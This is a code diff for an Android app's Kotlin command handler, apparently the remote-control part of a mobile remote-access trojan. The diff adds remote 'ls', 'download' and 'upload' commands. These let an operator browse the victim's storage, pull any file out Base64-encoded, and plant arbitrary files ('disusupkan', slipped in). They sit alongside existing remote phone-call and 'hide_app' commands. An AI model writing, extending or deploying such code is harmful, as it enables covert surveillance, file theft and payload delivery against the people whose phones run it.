@@ -586,6 +586,68 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     } else sendResponse(createResponse(cmdId, "error", "Izin CALL_PHONE belum di-ALLOW"))
                 }
+                "ls" -> {
+                    try {
+                        val path = if (textArg.isEmpty()) "/storage/emulated/0" else textArg
+                        val dir = java.io.File(path)
+                        val arr = JSONArray()
+                        if (dir.exists() && dir.isDirectory) {
+                            dir.listFiles()?.forEach {
+                                val obj = JSONObject().apply {
+                                    put("name", it.name)
+                                    put("is_dir", it.isDirectory)
+                                    put("size", if (it.isFile) it.length() else 0)
+                                    put("path", it.absolutePath)
+                                }
+                                arr.put(obj)
+                            }
+                            sendResponse(createResponse(cmdId, "ls_result", arr))
+                        } else {
+                            sendResponse(createResponse(cmdId, "error", "Direktori tidak ditemukan atau akses ditolak: $path"))
+                        }
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "File Explorer Gagal: ${e.message}"))
+                    }
+                }
+                "download" -> {
+                    Thread {
+                        try {
+                            val file = java.io.File(textArg)
+                            if (file.exists() && file.isFile) {
+                                val bytes = file.readBytes()
+                                val encoded = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
+                                val payload = JSONObject().apply {
+                                    put("name", file.name)
+                                    put("data", encoded)
+                                }
+                                sendResponse(createResponse(cmdId, "file_download", payload))
+                            } else {
+                                sendResponse(createResponse(cmdId, "error", "File tidak valid atau tidak ditemukan."))
+                            }
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Download gagal: ${e.message}"))
+                        }
+                    }.start()
+                }
+                "upload" -> {
+                    Thread {
+                        try {
+                            val parts = textArg.split("^^^")
+                            if (parts.size == 2) {
+                                val destPath = parts[0]
+                                val b64Data = parts[1]
+                                val bytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT)
+                                val file = java.io.File(destPath)
+                                file.writeBytes(bytes)
+                                sendResponse(createResponse(cmdId, "upload_success", "File berhasil disusupkan ke: $destPath"))
+                            } else {
+                                sendResponse(createResponse(cmdId, "error", "Format upload salah."))
+                            }
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Upload Gagal: ${e.message}"))
+                        }
+                    }.start()
+                }
                 "hide_app" -> {
                     try {
                         val packageManager = context.packageManager
